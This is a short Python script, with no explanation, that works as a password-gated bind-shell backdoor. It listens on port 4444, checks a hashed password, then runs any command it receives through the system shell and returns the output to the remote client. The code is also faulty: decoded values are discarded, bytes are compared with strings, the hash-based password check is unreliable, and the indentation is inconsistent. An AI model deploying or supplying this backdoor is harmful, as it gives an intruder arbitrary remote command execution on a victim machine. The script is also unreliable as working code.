import socket
import subprocess

HOST = ''
PORT = 4444

server = socket.socket()
server.bind((HOST, PORT))

print('Server Started')
print('Listening for Client Connection...')

server.listen(1)
client, client_addr = server.accept()

while True:
    	password = client.recv(1024)
    	password.decode()
    	print(password)
    	if hash(password) == 1634504265594755506:
            	break

while True:
    	try:
            	print('Awaiting Command')
            	command = client.recv(1024)
            	command.decode()

            	if command == 'exit':
                    	continue

            	op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            	output = op.stdout.read()
            	output_error = op.stderr.read()
            	print('Sending Response')

            	#print(output + output_error)
            	if output + output_error == '':
                    	client.send('no stdout')
            	else:
                    	client.send(output + output_error)
    	except:
            	server.listen(1)
                client, client_addr = server.accept()

server.close()
print('Connection Closed')